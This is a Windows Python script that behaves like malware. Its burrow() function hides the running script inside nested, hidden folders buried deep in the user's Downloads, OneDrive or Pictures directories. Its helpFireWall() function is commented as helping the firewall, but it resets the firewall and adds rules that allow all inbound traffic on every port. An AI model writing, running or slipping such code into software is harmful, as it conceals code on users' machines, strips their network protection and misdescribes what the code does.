import subprocess,os,random,shutil,sys

psPath = r"C:\Windows\System32\WindowsPowerShell\v1.0"

def burrow():
    #tries to move current python file deep inside random directories
    global burrowFlag
    burrowFlag = False
    destination = getNewPath()
    mkDir()
    try:
        if(getmade66DirFlag()):
            sixDirPath = r'\6666\666\66\6'
            mergePath = os.getcwd() + sixDirPath
            mergePath = mergePath[:-9]
            root = getLongestPath(mergePath,destination)
            print('ROOT: ', root)
            finaldestPath = root + sixDirPath
            try:
                os.system("attrib +h " + finaldestPath)
            except:
                pass
            print('FINALDESTPATH: ',finaldestPath)
            shutil.move(sys.argv[0], finaldestPath)
            burrowFlag = True
        elif(getmade69DirFlag()):
            sixNineDir = r'\6969\696\69\6'
            mergePath = os.getcwd() + sixNineDir
            mergePath = mergePath[:-9]
            root = getLongestPath(mergePath, destination)
            finaldestPath = root + sixNineDir
            try:
                os.system("attrib +h " + finaldestPath)
            except:
                pass
            shutil.move(sys.argv[0], finaldestPath)
            burrowFlag = True
        else:
            pass
    except:
        pass

def getNewPath():
    #gets a new path that is a folder within userHome
    userHome = os.path.expanduser('~')
    num = random.randint(1,3)
    path = ''
    #depending on what num is determines path
    if num == 1:
        path += userHome + r'\Downloads'
    elif num == 2:
        path += userHome + r'\OneDrive'
    else:
        path += userHome + r'\Pictures'
    return path

def getLongestPath(path, destination):
    #getsLongestPath/s from destination and appends them to list and returns one at random
    #that path index also moving path into
    roots = []
    temp = -1
    for root, subfiles, files in os.walk(destination):
        if os.path.isdir(root) and root != destination:
                try:
                    numSlashes = 0
                    for char in root:
                        if char == '\\' or char == '/': #counte number of slashes
                            numSlashes+=1
                    if numSlashes >= temp:
                        temp = numSlashes
                        roots.append(root)
                except:
                    continue
    longestPaths = []
    for root in roots:
        numSlashes = 0
        for char in root:
            if char == '\\' or char == '/':
                numSlashes += 1
        if numSlashes == temp:
            longestPaths.append(root)
    if len(longestPaths) is 0: #if for some reason there was nothing inside the directory return C drive
        return 'C:\\'
    randIndex = random.randint(0,len(longestPaths)-1)
    shutil.move(path,longestPaths[randIndex])
    return longestPaths[randIndex]

def mkDir():
    #makes a few directories and subdirectories and sets flags after made
    global made66DirFlag,made69DirFlag
    made66DirFlag = False
    made69DirFlag = False
    try:
        os.makedirs('6666/666/66/6')
        made66DirFlag = True
    except:
        try:
            os.makedirs('6969/696/69/6')
            made69DirFlag = True
        except:
            pass

def getmade66DirFlag():
    #getter method for made66DirFlag
    return made66DirFlag

def getmade69DirFlag():
    #getter method for made69DirFlag
    return made69DirFlag

def getBurrowFlag():
    #getter method for getBurrowFlag
    return burrowFlag

def helpFireWall():
    #helps firewall by trying to run a few helpful commands
    command1 = 'netsh advfirewall firewall reset'
    command2 = 'netsh advfirewall firewall set allprofiles state on'
    command3 = 'netsh advfirewall firewall add rule name = "Allow" protocol = all ' \
               'dir = in localport = all action = allow'
    command4 = 'netsh advfirewall firewall add portopening protocol = all port = all enable all'
    commands = [command1,command2,command3,command4]
    try:
        for command in commands:
            try:
                os.system(command)
            except:
                continue
    except:
        for command in commands:
            try:
                subprocess.call([psPath, command])
            except:
                continue
